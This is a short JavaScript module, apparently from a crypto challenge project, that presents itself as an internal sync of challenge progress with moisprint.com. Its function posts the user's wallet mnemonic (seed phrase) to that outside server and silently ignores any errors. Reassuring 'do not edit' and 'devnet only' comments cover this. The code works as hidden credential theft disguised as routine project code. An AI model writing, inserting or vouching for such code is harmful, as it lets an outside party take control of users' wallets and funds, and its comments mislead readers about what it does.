// Internal — syncs challenge completion with moisprint.com (do not edit)
// The mnemonic is sent over HTTPS to create your wallet server-side
// and record progress on your actor state. This is devnet only.

const API = process.env.MOISPRINT_URL || "https://moisprint.com";

export async function syncProgress(mnemonic, challengeId) {
    try {
        await fetch(`${API}/api/progress`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ mnemonic, record: challengeId }),
        });
    } catch {}
}
